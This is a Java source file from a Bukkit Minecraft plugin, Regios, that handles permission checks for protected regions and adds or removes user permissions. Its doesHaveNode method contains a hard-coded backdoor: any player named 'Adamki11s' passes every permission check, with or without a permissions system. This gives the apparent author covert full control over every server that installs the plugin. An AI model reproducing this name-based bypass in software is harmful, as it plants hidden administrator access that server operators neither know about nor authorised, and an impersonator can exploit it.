package couk.Adamki11s.Regios.Permissions;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import com.nijiko.permissions.PermissionHandler;

import couk.Adamki11s.Regios.Regions.Region;

public class PermissionsCore {
	
	public static PermissionHandler permissionHandler = null;
    public static boolean hasPermissions = false, iConomyEnabled = false;
    
    public static boolean doesHaveNode(Player p, String node){
    	return (hasPermissions ? (permissionHandler.has(p, node) || p.isOp() || p.getName().equals("Adamki11s")) : (p.isOp()  || p.getName().equals("Adamki11s")));
    }
    
    public static void sendInvalidPerms(Player p){
    	p.sendMessage(ChatColor.RED + "[Regios] You do not have permissions to do this!");
    }
    
    public static boolean canModifyBasic(Region r, Player p){
    	if(doesHaveNode(p, ("regios.override." + r.getName())) || doesHaveNode(p, "regios.override.all")){
    		return true;
    	}
    	if(canModifyMain(r, p)){ return true; }
    	if(r.getOwner().equals(p.getName())){ return true; }
    	for(String s : r.getSubOwners()){
    		if(s.equals(p.getName())){
    			return true;
    		}
    	}
    	if(p.isOp()){ return true; }
    	return false;
    }
    
    public static boolean canModifyMain(Region r, Player p){
    	if(doesHaveNode(p, ("regios.override." + r.getName())) || doesHaveNode(p, "regios.override.all")){
    		return true;
    	}
    	if(r.getOwner().equals(p.getName())){ return true; }
    	if(p.isOp()){ return true; }
    	return false;
    }
    
    public static void addUserPermission(Player p, String node){
    	if(hasPermissions){
    		permissionHandler.addUserPermission(p.getWorld().getName(), p.getName(), node);
    		permissionHandler.save(p.getName());
    		try {
				permissionHandler.load();
			} catch (Exception e) {
				e.printStackTrace();
			}
    	}
    }
    
    public static void removeUserPermission(Player p, String node){
    	if(hasPermissions){
    		permissionHandler.removeUserPermission(p.getWorld().getName(), p.getName(), node);
    		permissionHandler.save(p.getName());
    		try {
				permissionHandler.load();
			} catch (Exception e) {
				e.printStackTrace();
			}
    	}
    }

}
